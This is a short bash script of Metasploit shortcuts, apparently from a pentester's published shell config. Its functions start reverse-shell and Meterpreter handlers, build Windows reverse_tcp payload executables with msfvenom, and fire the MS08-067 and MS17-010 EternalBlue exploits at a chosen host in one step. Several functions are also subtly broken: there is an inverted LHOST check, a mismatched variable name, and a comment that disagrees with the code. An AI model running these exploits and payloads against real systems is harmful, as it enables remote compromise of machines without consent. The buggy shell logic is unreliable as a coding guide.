#!/bin/bash
#
# This software is provided under under the BSD 3-Clause License.
# See the accompanying LICENSE file for more information.
#
# Couple of functions to make quick use of msfconsole and msfvenom
#
# Author:
#  Arris Huijgen
#
# Website:
#  https://github.com/bitsadmin/linuxconfig
#

# Use setip to set the LHOST variable, then copy it to the clipboard
function getip() {
    setip $1
    echo -n $LHOST|xclip -i
    echo Copied \'$LHOST\' to clipboard and set \$LHOST variable
}

# Set LHOST variable to the IP of the specified interface (default: eth1)
function setip() {
    local IFACE=eth0
    if [ ! -z $1 ]
    then
        IFACE=$1
    fi
    export LHOST=$(ifconfig $IFACE 2>/dev/null|awk '/inet /{print $2}')
}

function getipfor() {
    setipfor $1
    echo -n $LHOST|xclip -i
    echo Copied \'$LHOST\' to clipboard and set \$LHOST variable
}

# In case there are multiple interfaces, based on the routing table
# determine which local IP is used for the IP address provided
# and store it in the LHOST variable
function setipfor() {
    local DEST=1.1.1.1
    if [ ! -z $1 ]
    then
        DEST=$1
    fi
    echo ip route get $DEST | grep src | awk '/src /{print $2}'
    export LHOST=$(ip route get $DEST | grep src | sed 's/.*src \([0-9\.]*\) .*/\1/g')
}

# Launch msfconsole with (stageless) reverse shell listener
function msfc() {
	local RHOST=""
	#local LHOST=$(getip)
	
	if [ ! -z $1 ]
	then
		RHOST="setg RHOST $1; setg RHOSTS $1"
		LHOST=$(getipfor $RHOST)
	fi
	
	if [ ! -z $LHOST ]
	then
		echo "Make sure to first set \$LHOST using setip[for]"
	fi
    
	msfconsole -x "setg LHOST $LHOST; setg SRVHOST $LHOST; $rhost; setg PAYLOAD windows/shell_reverse_tcp"
}

# Launch msfconsole with staged Meterpreter listener on port 4444
alias msf_rtcpm_handler="msfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT 4444; exploit\""

# Launch msfconsole with stageless reverse shell listener on port 4444
alias msf_rtcps_handler="msfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/shell_reverse_tcp; set LHOST \$LHOST; set LPORT 4444; exploit\""

# Generate a staged meterpreter payload
# Using the first parameter they payload format can be specified (default: exe)
# All possible payload formats can be listed using: msfvenom --list formats
function msf_rtcpm_generate() {
	local EXT=exe
	if [ ! -z $1 ]
	then
		EXT=$1
	fi
	setipfor
	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f $EXT -o rtcp.$EXT
}

# Generate a stageless reverse shell payload
# Using the first parameter they payload format can be specified (default: exe)
# All possible payload formats can be listed using: msfvenom --list formats
function msf_rtcps_generate() {
	local EXT=exe
	if [ ! -z $1 ]
	then
		EXT=$1
	fi
	setipfor
	msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f $EXT -o rtcp.$EXT
}

# Lauch MS08-067 exploit against host
function ms08067()
{
    local RHOST=$1
    local LHOST=$(setipfor $RHOST)
    msfconsole -x "setg LHOST $LHOST; setg RHOST $RHOST; use exploit/windows/smb/ms08_067_netapi; set PAYLOAD windows/meterpreter/reverse_https; exploit"
}

# Lauch MS17-010 exploit against host
function ms17010()
{
    local RHOST=$1
    local LHOST=$(setipfor $RHOST)
    msfconsole -x "setg LHOST $LHOST; setg RHOST $RHOST; use exploit/windows/smb/ms17_010_eternalblue; set PAYLOAD windows/x64/meterpreter/reverse_https; exploit"
}